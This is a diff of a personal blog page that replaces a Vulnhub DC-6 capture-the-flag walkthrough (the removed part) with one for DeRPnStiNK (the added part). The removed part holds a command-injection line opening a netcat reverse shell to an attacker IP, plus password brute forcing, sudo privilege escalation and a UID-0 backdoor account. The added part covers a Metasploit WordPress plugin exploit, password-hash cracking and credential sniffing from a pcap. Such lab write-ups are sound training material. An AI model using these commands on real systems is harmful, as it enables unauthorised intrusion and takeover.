@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulnhub-7DeRPnStiNK | G00d`s Blog</title>
 
 
 
@@ -321,76 +321,11 @@
                 <div class="container">
     
     
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulnhub-7DeRPnStiNK</h1>
             
                 <div class="post-meta">
                     
@@ -399,7 +334,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:04:56</a>
                         </span>
                     
                     
@@ -415,49 +350,43 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <p><img src="/vulnhub-7derpnstink//1.png" alt="1"></p>
+<p>arp-scan -l查到ip 192.168.0.136</p>
+<p>用nmap收集端口nmap -p- 192.168.0.136</p>
+<p>发现有21 22 80 ，nmap 21，22，80 -A 192..168.0.136与此同时查看浏览器80端口，在源代码中发现第一个flag</p>
+<p><img src="/vulnhub-7derpnstink//2.png" alt="2"></p>
+<p>继续进行信息收集，dirb <a target="_blank" rel="noopener" href="http://192.168.0.136/">http://192.168.0.136</a></p>
+<p>扫到了一个wblog页面但是重定向到<a target="_blank" rel="noopener" href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a>了，所以改一下hosts，同时也发现了有phpmyadmin</p>
+<p>进入wblog发现直接admin admin 弱口令登录了，查一下wordpress有哪些插件</p>
+<p>wpscan –url <a target="_blank" rel="noopener" href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> –enumerate p,t</p>
+<p><img src="/vulnhub-7derpnstink//3.png" alt="3"></p>
+<p>在msfconsole里找一下这个插件的漏洞</p>
+<p><img src="/vulnhub-7derpnstink//4.png" alt="4"></p>
+<p>show options ，这样设置</p>
+<p><img src="/vulnhub-7derpnstink//5.png" alt="5"></p>
+<p>拿到低权限shell 这个shell有点奇怪。</p>
+<p>用低权限账户查找有用信息，发现有2个账号可以切换，查看有什么提权方式。无用</p>
+<p>考虑查看一下phpmyadmin的配置密码</p>
+<p><img src="/vulnhub-7derpnstink//6.png" alt="6"></p>
+<p>查看phpmuadmin找到md5的密码</p>
+<p><img src="/vulnhub-7derpnstink//7.png" alt="7"></p>
+<p>写到1.hash中，用john 1.hash –show</p>
+<p>得到密码为 wedgie57 想起来找到的两个账号试试能不能登录发现stinky能够登录并且成功发现flag3</p>
+<p>并且也翻出来了key.txt能够ssh登陆了</p>
+<p><img src="/vulnhub-7derpnstink//8.png" alt="8"></p>
+<p>ssh -i key.txt <a href="mailto:&#115;&#116;&#x69;&#x6e;&#107;&#x79;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#x31;&#51;&#x36;">&#115;&#116;&#x69;&#x6e;&#107;&#x79;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#x31;&#51;&#x36;</a> -o PubkeyAcceptedKeyTypes&#x3D;+ssh-rsa</p>
+<p>连接上find &#x2F; -name “*.pcap” 2&gt;&#x2F;dev&#x2F;null找到那个pcap</p>
+<p>scp -i key.txt -o PubkeyAcceptedKeyTypes&#x3D;+ssh-rsa <a href="mailto:&#115;&#116;&#x69;&#x6e;&#107;&#x79;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#x31;&#x33;&#x36;">&#115;&#116;&#x69;&#x6e;&#107;&#x79;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#x31;&#x33;&#x36;</a>:&#x2F;home&#x2F;stinky&#x2F;Documents&#x2F;derpissues.pcap &#x2F;home&#x2F;kali</p>
+<p>过滤一下http</p>
+<p>http and http.request.method&#x3D;&#x3D;”POST”</p>
+<p><img src="/vulnhub-7derpnstink//9.png" alt="9"></p>
+<p>找到账号密码，在原有登录上直接su mrderp</p>
+<p><img src="/vulnhub-7derpnstink//10.png" alt="10"></p>
+<p>这里有一个ALL，那么把&#x2F;bin&#x2F;bash写入 shell.sh中</p>
+<p>chmod 777 <a target="_blank" rel="noopener" href="https://shell.sh/">shell.sh</a></p>
+<p>sudo .&#x2F;shell.sh获得shell</p>
+<p><a target="_blank" rel="noopener" href="https://wjmccann.github.io/blog/2018/06/14/DerpNStink-Walkthrough">https://wjmccann.github.io/blog/2018/06/14/DerpNStink-Walkthrough</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MCcming/article/details/136770520?ops_request_misc=%257B%2522request%255Fid%2522%253A%252279B3BC67-9AB2-4632-A5C5-B65317F0C38A%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=79B3BC67-9AB2-4632-A5C5-B65317F0C38A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-136770520-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=DeRPnStiNK">https://blog.csdn.net/MCcming/article/details/136770520?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%252279B3BC67-9AB2-4632-A5C5-B65317F0C38A%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;79B3BC67-9AB2-4632-A5C5-B65317F0C38A&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-2-136770520-null-null.142^v100^pc_search_result_base4&amp;utm_term&#x3D;DeRPnStiNK</a></p>
 
         </div>
 
@@ -494,10 +423,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulnhub-8imf/">Vulnhub-8IMF</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulnhub-6lordoftheroot-1-0-1/">Vulnhub-6LordOfTheRoot_1_0_1</a>
             
         </section>
 
